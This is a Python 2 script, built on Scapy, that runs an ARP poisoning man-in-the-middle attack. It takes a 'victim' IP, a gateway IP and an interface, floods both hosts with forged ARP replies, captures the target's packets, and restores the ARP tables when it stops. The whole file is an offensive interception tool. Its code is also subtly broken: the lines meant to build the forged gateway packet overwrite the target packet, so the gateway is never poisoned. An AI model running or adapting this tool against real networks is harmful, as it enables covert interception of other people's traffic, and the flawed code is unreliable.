__author__ = 'root'

from scapy.all import *

import os
import sys
import threading
import signal
from optparse import OptionParser

usageString= "usage: %prog [-t] target [-g] gateway [-i] interface [-c] number of packets "
parser = OptionParser(usage=usageString)
parser.add_option('-g','--gateway',action='store',type='string',dest='gateway_ip',help='The gateway/router to intercept')
parser.add_option('-t','--target',dest='target_ip',help='The victim to intercept')
parser.add_option('-i','--interface',dest='interface',help='Which interface to use')
parser.add_option('-c','--packetcount',type='int',dest='packet_count',help='the number of packets to record')
(options,args) = parser.parse_args()
if not options.target_ip:   # if filename is not given
    parser.error('Target not given')
if not options.gateway_ip:   # if filename is not given
    parser.error('Gateway not given')
if not options.interface:   # if filename is not given
    parser.error('Interface not given')
if not options.packet_count:
    parser.error('Number of Packets not given')

print "Gateway: ", options.gateway_ip
print "Target: ",options.target_ip
print "Interface: ",options.interface
print "Number of packets: ",options.packet_count
Pause = raw_input("\n Options supplied above, press Enter to continue")

###Functions

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    #method using send
    print "restoring target.."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)

    #signals the main thread to exit

    #os.kill(os.getpid(), signal.SIGINT)
    print "target restored"
    sys.exit(0)

def get_mac(ip_address):
        responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2,retry=10)

        #return MAC address from a response
        for s,r in responses:
            return r[Ether].src

        return None

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):

    poison_target=ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst=target_ip
    poison_target.hwdst =target_mac

    poison_gateway=ARP()
    poison_target.op = 2
    poison_target.psrc = target_ip
    poison_target.pdst=gateway_ip
    poison_target.hwdst =gateway_mac

    print "Beginning the ARP Poison"

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)


    print "ARP Poison Attack finished"
    return

















def print_packets(pkt):
    if pkt:
        return pkt.summary()


if __name__ == "__main__":

    interface= options.interface
    target_ip= options.target_ip
    gateway_ip= options.gateway_ip
    packet_count = options.packet_count

    #set interface
    conf.iface = interface

    #turn off output
    conf.verb = 0

    gateway_mac = get_mac(gateway_ip)

    print "[*] Setting up %s" % interface


    if gateway_mac is None:
        print "Failed to get Gateway MAC. Exiting"
        sys.exit(0)
    else:
        print "Gateway %s is at %s" %(gateway_ip, gateway_mac)



    target_mac = get_mac(target_ip)

    if target_mac is None:
        print "Failed to get Target Mac. Exiting"
        sys.exit(0)
    else:
        print "Target %s is at %s" %(target_ip,target_mac)



    #start poison thread
    Pause = raw_input("ready to poison, pres enter to continue")
    poison_thread = threading.Thread(target = poison_target, args =(gateway_ip,gateway_mac,target_ip,target_mac))
    poison_thread.start()

    try:
        print"Starting sniffer for %d packets " % packet_count

        bpf_filter="ip host %s" % target_ip
        packets= sniff(prn=print_packets,count=packet_count, filter=bpf_filter, iface=interface,store=0)

        #packets.show()
        #print "packets",packets.show()
        #write out the captured packets
       # wrpcap('arper.pcap',packets)

        #restore network
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
        sys.exit(0)

    except KeyboardInterrupt:
        #restore network
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
        sys.exit(0)
